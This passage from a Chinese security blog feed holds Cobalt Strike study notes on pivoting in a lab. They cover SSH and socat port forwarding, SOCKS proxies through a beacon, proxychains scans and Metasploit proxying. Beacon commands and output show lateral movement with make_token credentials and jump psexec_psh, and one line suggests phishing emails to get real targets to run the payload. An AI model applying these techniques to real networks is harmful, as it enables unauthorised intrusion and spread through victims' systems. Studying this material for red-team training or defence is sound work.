src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs23-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs23-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="7、数据转换语言"><a href="#7、数据转换语言" class="headerlink" title="7、数据转换语言"></a>7、数据转换语言</h2><pre class="line-numbers language-none"><code class="language-none">append &quot;string&quot;base64netbiosnetbiosuprepend &quot;string&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】22、通过SSH开通通道</title>
      <link href="//200419-150657.html"/>
      <url>//200419-150657.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这一节将来介绍如何通过 SSH 通道进行攻击。</p><h1 id="0x01-通过-SSH-建立通道"><a href="#0x01-通过-SSH-建立通道" class="headerlink" title="0x01 通过 SSH 建立通道"></a>0x01 通过 SSH 建立通道</h1><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs22-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>1、连接到上图中蓝色区域里的 PIVOT 主机并开启端口转发</p><pre class="line-numbers language-none"><code class="language-none">ssh -D 1080 user@&lt;blue pivot&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>该命令中的 -D 参数会使 SSH 建立一个 socket，并去监听本地的 1080 端口，一旦有数据传向那个端口，就自动把它转移到 SSH 连接上面，随后发往远程主机。</p></blockquote><p>2、在红色区域的 PIVOT 主机上开启通过 SSH Socks 的 445 端口转发</p><pre class="line-numbers language-none"><code class="language-none">socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:&lt;target&gt;:445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>socat 可以理解成 netcat 的加强版。socat 建立 socks 连接默认端口就是 1080 ，由于我们上面设置的就是 1080，因此这里不需变动。如果设置了其他端口，那么这里还需要在命令最后加上 <code>,socksport=&lt;port&gt;</code> 指定端口才行。</p></blockquote><p>3、在攻击者控制的主机上运行 beacon，使其上线</p><pre class="line-numbers language-none"><code class="language-none">注意需要使用 administrator 权限运行 beacon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4、在上线的主机上运行以下命令</p><pre class="line-numbers language-none"><code class="language-none">make_token [DOMAIN\user] [password]jump psexec_psh &lt;red pivot&gt; [listener]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>整体的流程就是下面这张图一样。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs22-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-演示"><a href="#0x02-演示" class="headerlink" title="0x02 演示"></a>0x02 演示</h1><p>我在本地搭建了这样的一个环境。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs22-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><ol><li>首先使 Win1 主机上线，接着在 Linux1 主机上通过 SSH 连接到 Linux2 主机。</li></ol><pre class="line-numbers language-none"><code class="language-none">ssh -D 1080 user@192.168.175.146<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">> ssh <span class="token operator">-</span>D 1080 user@192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>146user@192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>146's password: Last login: Fri Jul 31 20:00:54 2020 <span class="token keyword">from</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>1user@ubuntu:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2、在 Linux1 主机上开启 445 端口转发</p><pre class="line-numbers language-none"><code class="language-none">socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:192.168.232.132:445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、在 Win1 主机上运行以下命令使 Win2 上线</p><pre class="line-numbers language-none"><code class="language-none">make_token teamssix\administrator Test123!jump psexec_psh 192.168.175.200 smb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> make_token teamssix\administrator Test123<span class="token operator">!</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to create a token <span class="token keyword">for</span> teamssix\administrator<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 61 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Impersonated WINTEST\Administratorbeacon> jump psexec_psh 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200 smb<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run windows<span class="token operator">/</span>beacon_bind_pipe <span class="token punctuation">(</span>\\<span class="token punctuation">.</span>\pipe\msagent_532c<span class="token punctuation">)</span> on 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200 via Service Control Manager <span class="token punctuation">(</span>PSH<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 5886 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:Started service 4aea3b9 on 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 204473 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> established link to child beacon: 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4、随后便可以看到通过 SSH 上线的主机</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs22-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考链接：</p><p><a href="https://payloads.online/tools/socat">https://payloads.online/tools/socat</a></p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://blog.csdn.net/pipisorry/article/details/52269785">https://blog.csdn.net/pipisorry/article/details/52269785</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】21、反向转发通道的建立</title>
      <link href="//200419-150651.html"/>
      <url>//200419-150651.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这一节将介绍使用 ProxyChains 进行代理转发与使用反向转发的方法。</p><h1 id="0x01-使用-ProxyChains-进行代理转发"><a href="#0x01-使用-ProxyChains-进行代理转发" class="headerlink" title="0x01 使用 ProxyChains 进行代理转发"></a>0x01 使用 ProxyChains 进行代理转发</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>使用 ProxyChains 可以使我们为没有代理配置功能的软件强制使用代理</p><ol><li>和<a href="https://teamssix.com/year/200419-150644.html">上一节</a>中介绍的一致，开启一个 socks 代理服务</li><li>配置 <code>/etc/proxychains.conf</code> 文件</li><li>运行 <code>proxychains + 待执行命令</code></li></ol><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>接下来继续<a href="https://teamssix.com/year/200419-150644.html">上一节</a>中的演示环境：</p><blockquote><p>攻击机 IP：192.168.175.200</p><p>上线主机：外部IP 192.168.175.130、内部IP 192.168.232.133</p><p>攻击目标：192.168.232.0/24 地址段</p></blockquote><h3 id="1、设置-socks-代理"><a href="#1、设置-socks-代理" class="headerlink" title="1、设置 socks 代理"></a>1、设置 socks 代理</h3><p>首先开启交互模式，之后开启 socks 代理</p><pre class="line-numbers language-none"><code class="language-none">sleep 0socks 9527<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> <span class="token function">sleep</span> 0<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to become interactive<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 16 bytesbeacon> socks 9527<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 16 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> started SOCKS4a server on: 9527<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、配置-ProxyChains"><a href="#2、配置-ProxyChains" class="headerlink" title="2、配置  ProxyChains"></a>2、配置  ProxyChains</h3><p>在攻击机上，配置 <code>/etc/proxychains.conf</code> 文件的最后一行，根据当前攻击主机 IP 与设置的 Socks 端口，修改如下：</p><pre class="line-numbers language-none"><code class="language-none">socks4 192.168.175.200 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3、开始使用-ProxyChains"><a href="#3、开始使用-ProxyChains" class="headerlink" title="3、开始使用  ProxyChains"></a>3、开始使用  ProxyChains</h3><p>根据<a href="https://teamssix.com/year/200419-150644.html">上一节</a>使用 Metasploit 的扫描可以知道，在 192.168.232.0/24 地址段中存在主机 192.168.232.132 ，接下来使用 nmap 扫描一下常见的端口，这里以 80,443,445,3389 作为演示。</p><pre class="line-numbers language-none"><code class="language-none">proxychains nmap -sT -Pn 192.168.232.132 -p 80,443,445,3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>-sT：使用 TCP 扫描</p><p>-Pn：不使用 Ping</p><p>-p：指定扫描端口</p><p>注：不加上 -sT -Pn 参数，将无法使用 proxychains 进行代理扫描</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">> proxychains nmap <span class="token operator">-</span>sT <span class="token operator">-</span>Pn 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132 <span class="token operator">-</span>p 80<span class="token punctuation">,</span>443<span class="token punctuation">,</span>445<span class="token punctuation">,</span>3389                       <span class="token namespace">[proxychains]</span> config file found: <span class="token operator">/</span>etc<span class="token operator">/</span>proxychains<span class="token punctuation">.</span>conf<span class="token namespace">[proxychains]</span> preloading <span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libproxychains<span class="token punctuation">.</span>so<span class="token punctuation">.</span>4<span class="token namespace">[proxychains]</span> DLL init: proxychains<span class="token operator">-</span>ng 4<span class="token punctuation">.</span>14Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>09<span class="token operator">-</span>07 23:05 EDT<span class="token namespace">[proxychains]</span> Strict chain  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:80  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  OK<span class="token namespace">[proxychains]</span> Strict chain  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  OK<span class="token namespace">[proxychains]</span> Strict chain  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:3389  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  OK<span class="token namespace">[proxychains]</span> Strict chain  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:443 &lt;<span class="token operator">--</span>deniedNmap scan report <span class="token keyword">for</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>19s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>PORT     STATE  SERVICE80<span class="token operator">/</span>tcp   open   http443<span class="token operator">/</span>tcp  closed https445<span class="token operator">/</span>tcp  open   microsoft<span class="token operator">-</span>ds3389<span class="token operator">/</span>tcp open   ms<span class="token operator">-</span>wbt<span class="token operator">-</span>serverNmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 14<span class="token punctuation">.</span>35 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过扫描可以看到目标 80 端口是开放的，接下来使用 curl 作为对比示例。</p><pre class="line-numbers language-none"><code class="language-none">curl 192.168.232.132proxychains curl 192.168.232.132<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">> curl 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132curl: <span class="token punctuation">(</span>7<span class="token punctuation">)</span> Failed to connect to 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132 port 80: No route to host> proxychains curl 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132<span class="token namespace">[proxychains]</span> config file found: <span class="token operator">/</span>etc<span class="token operator">/</span>proxychains<span class="token punctuation">.</span>conf<span class="token namespace">[proxychains]</span> preloading <span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libproxychains<span class="token punctuation">.</span>so<span class="token punctuation">.</span>4<span class="token namespace">[proxychains]</span> DLL init: proxychains<span class="token operator">-</span>ng 4<span class="token punctuation">.</span>14<span class="token namespace">[proxychains]</span> Strict chain  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:80  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  OK&lt;<span class="token operator">!</span>DOCTYPE html PUBLIC <span class="token string">"-//W3C//DTD XHTML 1.0 Strict//EN"</span> <span class="token string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"</span>>&lt;html xmlns=<span class="token string">"http://www.w3.org/1999/xhtml"</span>>&lt;head>&lt;meta http<span class="token operator">-</span>equiv=<span class="token string">"Content-Type"</span> content=<span class="token string">"text/html; charset=iso-8859-1"</span> <span class="token operator">/</span>>……内容太多，此处省略……                 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-反向转发"><a href="#0x02-反向转发" class="headerlink" title="0x02 反向转发"></a>0x02 反向转发</h1><p>反向转发顾名思义就是和<a href="https://teamssix.com/year/200419-150644.html">上一节</a>中提到的转发路径相反，之前我们设置的代理是 <code>CS服务端 --&gt; 上线主机 --&gt; 内网主机</code>，反向转发则是 <code>内网主机 --&gt; 上线主机 --&gt; CS服务端</code>。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs21-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>继续使用上面的演示环境，首先右击上线主机会话，选择 <code>Pivoting --&gt; Listener</code> ，除了 Name 选项之外，CS 都会自动配置好，这里直接使用默认的配置信息。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs21-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>之后生成一个 Windows 可执行文件，选择上一步生成的监听器，如果目标是 64 位则勾选使用 x64 Payload 的选项。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs21-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>之后将该可执行文件在目标主机上执行即可，在现实环境中可以尝试使用钓鱼邮件的方式诱导目标执行。</p><p>当目标执行该文件后，就会发现当前不出网的 192.168.232.132 主机已经上线了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs21-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>有一说一，关于这部分网上大部分教程还是 CS 3.x 版本的教程，而在 4.0 的操作中个人感觉要方便很多。</p><p>网上关于这部分内容的 CS 4.0 的教程真的是少之又少，一开始在参考 3.x 教程的时候踩了很多坑，最后终于某内部知识库发现了一篇关于这部分内容的 4.0 教程，在该教程的参考下才发现居然如此简单。</p><blockquote><p>参考链接：<a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】20、通过Socks转发的方法</title>
      <link href="//200419-150644.html"/>
      <url>//200419-150644.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这一小节中，将看看如何构建一个 SOCKS 代理服务器使一个上线主机变成我们的跳板机。</p><h1 id="0x01-Pivoting"><a href="#0x01-Pivoting" class="headerlink" title="0x01 Pivoting"></a>0x01 Pivoting</h1><blockquote><p>根据 A-Team 团队中 CS 手册中的介绍，<code>Pivoting</code> 是指 <code>将一个受害机器转为其他攻击和工具的跳板</code> 的操作。</p></blockquote><p>在进行 Pivoting 操作之前，需要将当前会话改为交互模式，也就是说输入命令就被执行，执行 <code>sleep 0</code> 即为交互模式。</p><h1 id="0x02-Socks"><a href="#0x02-Socks" class="headerlink" title="0x02 Socks"></a>0x02 Socks</h1><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs20-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><ul><li><p>在当前 beacon 上可以右击选择 <code>Pivoting --&gt; SOCKS Server</code> 设置一个 Socks4a 代理服务</p></li><li><p>或者使用命令 <code>socks [port]</code> 进行设置</p></li><li><p>使用命令 <code>socks stop</code> 关闭 Socks 代理服务</p></li><li><p>在 <code>View --&gt; Proxy Pivots</code> 中可以看到已经创建的代理服务</p></li></ul><h1 id="0x03-Metasploit-连接到-Socks-代理服务"><a href="#0x03-Metasploit-连接到-Socks-代理服务" class="headerlink" title="0x03 Metasploit 连接到 Socks 代理服务"></a>0x03 Metasploit 连接到 Socks 代理服务</h1><ul><li>CS 中创建好代理后，在 Metasploit 中可以运行以下命令通过 beacon 的 Socks 代理进行通信</li></ul><pre class="line-numbers language-none"><code class="language-none">setg Proxies socks4:127.0.0.1:[port]setg ReverseAllowProxy true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果感觉上面命令比较长，还可以在 <code>Proxy Pivots</code> 界面中点击 <code>Tunnel</code> 按钮查看命令。</p><ul><li>运行以下命令来停止</li></ul><pre class="line-numbers language-none"><code class="language-none">unsetg Proxies<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>setg 命令和 unsetg 表示在 metasploit 中全局有效，不用在每次选择模块后再重新设置。</p><h1 id="0x04-演示"><a href="#0x04-演示" class="headerlink" title="0x04 演示"></a>0x04 演示</h1><h2 id="1、环境说明"><a href="#1、环境说明" class="headerlink" title="1、环境说明"></a>1、环境说明</h2><blockquote><p>攻击机 IP：192.168.175.200</p><p>上线主机：外部IP 192.168.175.130、内部IP 192.168.232.133</p><p>攻击目标：192.168.232.0/24 地址段</p></blockquote><p>当前已经上线了一个 IP 为 192.168.175.130 主机，通过 ipconfig 发现，该主机也在 192.168.232.0/24 地址段内。</p><p>但当前攻击机无法访问 232 的地址段，因此如果想对 232 段内的主机发起攻击，就可以采用将 192.168.175.130 作为跳板机访问的方式。</p><h2 id="2、设置-socks-代理"><a href="#2、设置-socks-代理" class="headerlink" title="2、设置 socks 代理"></a>2、设置 socks 代理</h2><p>开启交互模式</p><pre class="line-numbers language-none"><code class="language-none">sleep 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> <span class="token function">sleep</span> 0<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to become interactive<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 16 bytes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>开启 socks 代理</p><pre class="line-numbers language-none"><code class="language-none">socks 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> socks 9527<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> started SOCKS4a server on: 9527<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 16 bytes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以上操作也可以通过图形化的方式进行。</p><h2 id="3、Metasploit-中进行设置"><a href="#3、Metasploit-中进行设置" class="headerlink" title="3、Metasploit 中进行设置"></a>3、Metasploit 中进行设置</h2><p>开启 Metasploit 后，运行 setg 命令</p><pre class="line-numbers language-none"><code class="language-none">setg Proxies socks4:192.168.175.200:9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msf5 > setg Proxies socks4:192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527Proxies => socks4:192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4、扫描-192-168-232-0-24-地址段中的-445-端口"><a href="#4、扫描-192-168-232-0-24-地址段中的-445-端口" class="headerlink" title="4、扫描 192.168.232.0/24 地址段中的 445 端口"></a>4、扫描 192.168.232.0/24 地址段中的 445 端口</h2><p>这里作为演示，只扫描一下 445 端口</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_versionset rhost 192.168.232.0&#x2F;24set threads 64exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msf5 > use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version msf5 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version<span class="token punctuation">)</span> > <span class="token function">set</span> rhost 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24 rhost => 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24msf5 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version<span class="token punctuation">)</span> > <span class="token function">set</span> threads 64threads => 64msf5 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version<span class="token punctuation">)</span> > exploit use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned  44 of 256 hosts <span class="token punctuation">(</span>17<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned  64 of 256 hosts <span class="token punctuation">(</span>25<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token 